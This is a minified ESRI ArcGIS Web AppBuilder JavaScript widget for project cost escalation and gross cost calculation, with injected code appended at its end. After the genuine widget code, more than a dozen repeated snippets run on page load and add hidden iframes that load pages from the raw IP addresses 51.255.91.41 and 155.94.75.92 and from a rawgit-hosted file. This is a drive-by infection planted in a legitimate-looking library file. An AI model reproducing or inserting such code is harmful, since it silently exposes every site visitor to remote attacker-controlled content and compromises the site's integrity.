// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/project-summary.html":'\x3cdiv style\x3d"height: 100%; width: 100%"\x3e\r\n  \x3cdiv class\x3d"esriCTContentSection"\x3e\r\n    \x3cdiv class\x3d"esriCTCostEscalationTitle"\x3e\r\n      ${nls.costEscalation.costEscalationLabel}\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTCostEscalatioParent" data-dojo-attach-point\x3d"costEscalationTableNode"\x3e\x3c/div\x3e\r\n    \x3cdiv\x3e\r\n      \x3c!--Add/delete/reorder buttons--\x3e\r\n      \x3cdiv style\x3d"height: 30px;" class\x3d"esriCTStatisticsButtonParentDiv"\x3e\r\n        \x3cdiv class\x3d"esriCTAddStatisticsIcon esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnAddNode" title\x3d"${nls.costEscalation.addCostEscalationText}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTDeleteStatisticsIconDisable esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnCrossNode" title\x3d"${nls.costEscalation.deleteCostEscalationText}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTStatisticsUpIconDisable esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnUpNode" title\x3d"${nls.costEscalation.moveCostEscalationUpText}"\x3e\x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTStatisticsDownIconDisable esriCTStatisticsButtons" data-dojo-attach-point\x3d"btnDownNode" title\x3d"${nls.costEscalation.moveCostEscalationDownText}"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Project Total and Gross Cost table--\x3e\r\n      \x3cdiv class\x3d"esriCTBoldFont" data-dojo-attach-point\x3d"totalProjectCost"\x3e\r\n        \x3ctable class\x3d"esriCTProjectCostTable" style\x3d"width: 100%;"\x3e\r\n          \x3ctbody\x3e\r\n            \x3ctr\x3e\r\n              \x3ctd class\x3d"esriCTProjectSummaryTotalCostLabel" data-dojo-attach-point\x3d"totalCostLabel"\x3e${nls.projectOverview.totalCostLabel}\x3c/td\x3e\r\n              \x3ctd class\x3d"esriCTProjectSummaryTotalCost" data-dojo-attach-point\x3d"totalCostDiv"\x3e\x3c/td\x3e\r\n            \x3c/tr\x3e\r\n            \x3ctr\x3e\r\n              \x3ctd class\x3d"esriCTProjectSummaryTotalGrossLabel" data-dojo-attach-point\x3d"grossCostLabel"\x3e${nls.projectOverview.grossCostLabel}\x3c/td\x3e\r\n              \x3ctd class\x3d"esriCTProjectSummaryTotalGross" data-dojo-attach-point\x3d"grossCostDiv"\x3e\x3c/td\x3e\r\n            \x3c/tr\x3e\r\n            \x3ctr\x3e\r\n              \x3ctd style\x3d"font-weight: normal; font-style: italic;" colspan\x3d"2" data-dojo-attach-point\x3d"roundingLabel"\x3e${nls.projectOverview.roundingLabel}\x3c/td\x3e\r\n            \x3c/tr\x3e\r\n          \x3c/tbody\x3e\r\n        \x3c/table\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"okButton"\x3e${nls.common.ok}\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"cancelButton"\x3e${nls.common.cancel}\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./project-summary.html dojo/_base/lang dojo/dom-attr dojo/on jimu/dijit/SimpleTable jimu/dijit/LoadingIndicator dojo/query dojo/dom-class dijit/form/ValidationTextBox dojo/dom-construct dijit/form/Select dijit/registry dojo/_base/array dojo/store/Memory dojo/_base/html dijit/focus esri/graphic".split(" "),function(u,v,w,x,y,d,n,g,z,A,k,f,p,m,B,l,e,C,q,r,t){return u([v,w,x],{templateString:y,baseClass:"jimu-widget-cost-analysis-project-summary",
_costFieldStore:null,totalCost:0,projectInfo:null,previouslyAddedEscalations:[],loadingProject:!1,postCreate:function(){this.inherited(arguments);this.totalCost=0;this.previouslyAddedEscalations=[];this._handleClickEvents();this._initLoadingIndicator()},_initLoadingIndicator:function(){this._loadingIndicator=new A({hidden:!0});this._loadingIndicator.placeAt(this.domNode.parentNode.parentNode.parentNode);this._loadingIndicator.startup()},_handleClickEvents:function(){this.own(g(this.btnAddNode,"click",
d.hitch(this,function(){f.contains(this.btnAddNode,"esriCTAddStatisticsIconDisable")||(this._addCostEscalationBtnClicked(),this._handleActionButtonVisibility())})));this.own(g(this.btnCrossNode,"click",d.hitch(this,function(){f.contains(this.btnCrossNode,"esriCTDeleteStatisticsIconDisable")||this._deleteLayerRow()})));this.own(g(this.btnUpNode,"click",d.hitch(this,this._upArrowClicked)));this.own(g(this.btnDownNode,"click",d.hitch(this,this._downArrowClicked)));this.own(g(this.okButton,"click",d.hitch(this,
function(){var a,b;a=!0;b=this._costEscalationTable.getRows();e.forEach(b,d.hitch(this,function(b){b.costLabelTextBox.isValid()||(a=!1,r.focus(b.costLabelTextBox));b.costValueLabelTextBox.isValid()||(a=!1,r.focus(b.costValueLabelTextBox))}));a?(this.calculateGrossCost(this.totalCost,!0),this.emit("onOkButtonClicked")):this.appUtils.showMessage(this.nls.costEscalation.invalidEntry)})));this.own(g(this.cancelButton,"click",d.hitch(this,function(){this.emit("onCancelButtonClicked");this._loadingIndicator.show();
this._costEscalationTable.clear();e.forEach(this.tableData,d.hitch(this,function(a){this._addCostEscalationLayerRow(a)}));this._updateGrossCost();this._loadingIndicator.hide()})))},_upArrowClicked:function(){if(!f.contains(this.btnUpNode,"esriCTStatisticsUpIconDisable")){var a,b;b=this._costEscalationTable.getRows();var c=this._costEscalationTable.getData();e.forEach(c,d.hitch(this,function(c,d){c.editable&&(a=b[d])}));this._costEscalationTable.onBeforeRowUp(a)&&(c=e.indexOf(b,a),0<c&&(c=b[c-1]))&&
(q.place(a,c,"before"),this._costEscalationTable.updateUI(),this._costEscalationTable.emit("row-up",a),this._updateGrossCost())}},_downArrowClicked:function(){if(!f.contains(this.btnDownNode,"esriCTStatisticsDownIconDisable")){var a,b;b=this._costEscalationTable.getRows();var c=this._costEscalationTable.getData();e.forEach(c,d.hitch(this,function(c,d){c.editable&&(a=b[d])}));this._costEscalationTable.onBeforeRowDown(a)&&(c=e.indexOf(b,a),c<b.length-1&&(c=b[c+1]))&&(q.place(a,c,"after"),this._costEscalationTable.updateUI(),
this._costEscalationTable.emit("row-down",a),this._updateGrossCost())}},startup:function(){this.inherited(arguments);this._init()},reset:function(a){this.projectInfo=a;this._costEscalationTable.clear();this.totalCost=0;this.previouslyAddedEscalations=[];this.tableData=[]},_init:function(){this._createCostEscalationFieldTable();this._createCostTypeFieldStore()},cloneTableData:function(){this.tableData=[];var a=[],b={};this._costEscalationTable&&this._costEscalationTable.getRows().length&&(e.forEach(this._costEscalationTable.getRows(),
d.hitch(this,function(c){b={};c.costLabelTextBox&&(b.label=c.costLabelTextBox.getValue());c.costTypeLabelDropdown&&(b.type=c.costTypeLabelDropdown.getValue());c.costValueLabelTextBox&&(b.costValue=c.costValueLabelTextBox.getValue());a.push(b)})),this.tableData=d.clone(a));this._handleActionButtonVisibility()},loadAdditionalCost:function(a){var b={};a.sort(d.hitch(this,this._sortFeatureArray));e.forEach(a,d.hitch(this,function(a){b={};b.label=a.attributes[this.config.projectMultiplierFields.DESCRIPTION];
b.type=a.attributes[this.config.projectMultiplierFields.TYPE];b.costValue=a.attributes[this.config.projectMultiplierFields.VALUE];if("+"===b.type||"*"===b.type||"_"===b.type)this.additionalCostTable&&this._storeAsPreviouslyAdded(a.attributes[this.additionalCostTable.objectIdField]),this._addCostEscalationLayerRow(b)}))},_sortFeatureArray:function(a,b){var c=this.config.projectMultiplierFields.COSTINDEX;return a.attributes[c]-b.attributes[c]},_createCostEscalationFieldTable:function(){this._costEscalationTable=
new z({fields:[{name:"editable",title:this.nls.common.label,type:"checkbox",editable:!1,width:"40%"},{name:"field",title:this.nls.common.type,type:"empty",editable:!1,width:"30%"},{name:"field",title:this.nls.costEscalation.valueHeader,type:"empty",editable:!0,width:"40%"}],selectable:!1,autoHeight:!0});this._costEscalationTable.placeAt(this.costEscalationTableNode);this._costEscalationTable.startup()},_handleCheckBoxClick:function(a){var b;b=k(".simple-table-title .jimu-checkbox",this.domNode)[0];
a=k(".jimu-checkbox",a)[0];g(l.byNode(b),"change",d.hitch(this,function(){this._handleActionButtonVisibility()}));g(l.byNode(a),"change",d.hitch(this,function(){this._handleActionButtonVisibility()}))},_handleActionButtonVisibility:function(){var a,b=!0,c=0,h;a=this._costEscalationTable.getRows();h=k(".simple-table-title .jimu-checkbox",this.domNode)[0];h=l.byNode(h);e.forEach(a,d.hitch(this,function(a){""===d.trim(a.costLabelTextBox.value)&&(b=!1);if(isNaN(a.costValueLabelTextBox.value)||""===d.trim(a.costValueLabelTextBox.value+
"")||"0"===a.costValueLabelTextBox.value||0===a.costValueLabelTextBox.value)b=!1;a=k(".jimu-checkbox",a)[0];l.byNode(a).checked&&c++}));0===c?f.replace(this.btnCrossNode,"esriCTDeleteStatisticsIconDisable","esriCTDeleteStatisticsIcon"):f.replace(this.btnCrossNode,"esriCTDeleteStatisticsIcon","esriCTDeleteStatisticsIconDisable");b||0===a.length?f.replace(this.btnAddNode,"esriCTAddStatisticsIcon","esriCTAddStatisticsIconDisable"):f.replace(this.btnAddNode,"esriCTAddStatisticsIconDisable","esriCTAddStatisticsIcon");
b&&1===c&&1<a.length?(f.replace(this.btnUpNode,"esriCTStatisticsUpIcon","esriCTStatisticsUpIconDisable"),f.replace(this.btnDownNode,"esriCTStatisticsDownIcon","esriCTStatisticsDownIconDisable")):(f.replace(this.btnUpNode,"esriCTStatisticsUpIconDisable","esriCTStatisticsUpIcon"),f.replace(this.btnDownNode,"esriCTStatisticsDownIconDisable","esriCTStatisticsDownIcon"));0===a.length?(h.set("status",!1),f.add(h.domNode,"jimu-state-disabled")):(h.set("status",!0),f.remove(h.domNode,"jimu-state-disabled"))},
_addCostEscalationBtnClicked:function(){this._addCostEscalationLayerRow()},_addCostEscalationLayerRow:function(a){var b,c;b=this._costEscalationTable.addRow({});c=k(".simple-table-cell",b.tr);this._handleCheckBoxClick(b.tr);c&&(b=b.tr,this._addCostLabelTextBox(c[0],b,a),this._addCostTypeLabelDropdown(c[1],b,a),this._addCostValueLabelTextBox(c[2],b,a))},_addCostLabelTextBox:function(a,b,c){a=m.create("div",{"class":"esriCTTextBoxContainer"},a);b.costLabelTextBox=new p({"class":"esriCTCostLabelTextbox esriCTAddLayerTableNode"},
a);b.costLabelTextBox.startup();c&&c.label&&b.costLabelTextBox.set("value",c.label);b.costLabelTextBox.validator=d.hitch(this,this._validateCostEscalationLabelFields);this.own(g(b.costLabelTextBox,"change",d.hitch(this,function(){this._handleActionButtonVisibility()})))},_validateCostEscalationLabelFields:function(a){return""===d.trim(a)?!1:!0},_addCostTypeLabelDropdown:function(a,b,c){a=m.create("div",{"class":"esriCTCostTypeDropDownContainer esriCTAddLayerTableNode"},a);b.costTypeLabelDropdown=
new B({name:"layerSelect",store:this._costFieldStore,labelAttr:"name","class":"esriCTCostTypeDropdown"},a);c&&c.type&&(c=b.costTypeLabelDropdown.store.get(c.type),b.costTypeLabelDropdown.setValue(c.value));this.own(g(b.costTypeLabelDropdown,"change",d.hitch(this,this._updateGrossCost)));b.costTypeLabelDropdown.startup()},_addCostValueLabelTextBox:function(a,b,c){a=m.create("div",{"class":"esriCTTextBoxContainer esriCTAddLayerTableNode"},a);b.costValueLabelTextBox=new p({"class":"esriCTCostLabelTextbox",
trim:!0},a);b.costValueLabelTextBox.startup();c&&c.costValue&&b.costValueLabelTextBox.set("value",c.costValue);b.costValueLabelTextBox.validator=d.hitch(this,this._validateCostEscalationValueFields);this.own(g(b.costValueLabelTextBox,"change",d.hitch(this,function(){this._updateGrossCost();this._handleActionButtonVisibility()})))},_validateCostEscalationValueFields:function(a){return""===a||isNaN(a)||"0"===a||0===a?!1:!0},_getCostEscalationArray:function(){var a,b;a=this._costEscalationTable.getRows();
b=[];e.forEach(a,d.hitch(this,function(a){b.push({label:a.costLabelTextBox.getValue(),type:a.costTypeLabelDropdown.getValue(),value:a.costValueLabelTextBox.getValue()})}));return b},_deleteLayerRow:function(){var a=this._costEscalationTable.getRows(),b=this._costEscalationTable.getData();e.forEach(b,d.hitch(this,function(b,d){b.editable&&(this._costEscalationTable.deleteRow(a[d]),this._updateGrossCost())}));0===this._costEscalationTable.getRows().length&&(b=k("th .checkbox",this.costEscalationTableNode)[0],
f.contains(b,"checked")&&f.remove(b,"checked"));this._handleActionButtonVisibility()},_createCostTypeFieldStore:function(){var a;a=[];a.push({name:"+",value:"+"});a.push({name:"*",value:"*"});a.push({name:"-",value:"_"});this._costFieldStore=new C({idProperty:"value",data:a})},_updateGrossCost:function(){var a;if(!this.loadingProject){a=this._getCostEscalationArray();var b=this.totalCost,c=[],f=[];e.forEach(a,d.hitch(this,function(a,d){var e=parseFloat(a.value),g={};if(e){this.projectInfo&&this.projectInfo.projectId&&
this.config.projectMultiplierFields&&(g[this.config.projectMultiplierFields.DESCRIPTION]=a.label,g[this.config.projectMultiplierFields.TYPE]=a.type,g[this.config.projectMultiplierFields.VALUE]=e,g[this.config.projectMultiplierFields.COSTINDEX]=d+1,g[this.config.projectMultiplierFields.PROJECTGUID]=this.projectInfo.projectId,c.push(new t(null,null,g)));switch(a.type){case "+":b+=e;break;case "_":b-=e;break;case "*":b*=e}f.push({label:a.label,type:a.type,value:e})}}));a=this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,
this.totalCost);a=this.config.generalSettings.currency+" "+a;n.set(this.totalCostDiv,"innerHTML",a);a=this.appUtils.roundProjectCostValue(this.config.generalSettings.roundCostType,b);a=this.config.generalSettings.currency+" "+a;n.set(this.grossCostDiv,"innerHTML",a);return{grossCost:b,features:c,additionalCostInfo:f}}},calculateGrossCost:function(a,b){this.totalCost=a;this.loadingProject||(a=this._updateGrossCost(),this.emit("grossCostUpdated",this.totalCost,a.grossCost,a.additionalCostInfo),b&&this._updateCostEscalationTable(a.features))},
_updateCostEscalationTable:function(a){this.additionalCostTable&&(0<a.length||0<this.previouslyAddedEscalations.length)&&(this._loadingIndicator.show(),this.additionalCostTable.applyEdits(a,null,this.previouslyAddedEscalations,d.hitch(this,function(a){var b=!1;this.previouslyAddedEscalations=[];a&&0<a.length&&(e.forEach(a,d.hitch(this,function(a){a.success?this._storeAsPreviouslyAdded(a.objectId):b=!0})),b&&this.appUtils.showMessage(this.nls.workBench.errorInSavingCostEscalation));this._loadingIndicator.hide()}),
d.hitch(this,function(){this._loadingIndicator.hide();this.appUtils.showMessage(this.nls.workBench.errorInSavingCostEscalation)})))},_storeAsPreviouslyAdded:function(a){var b={};b[this.additionalCostTable.objectIdField]=a;a=new t(null,null,b);this.previouslyAddedEscalations.push(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});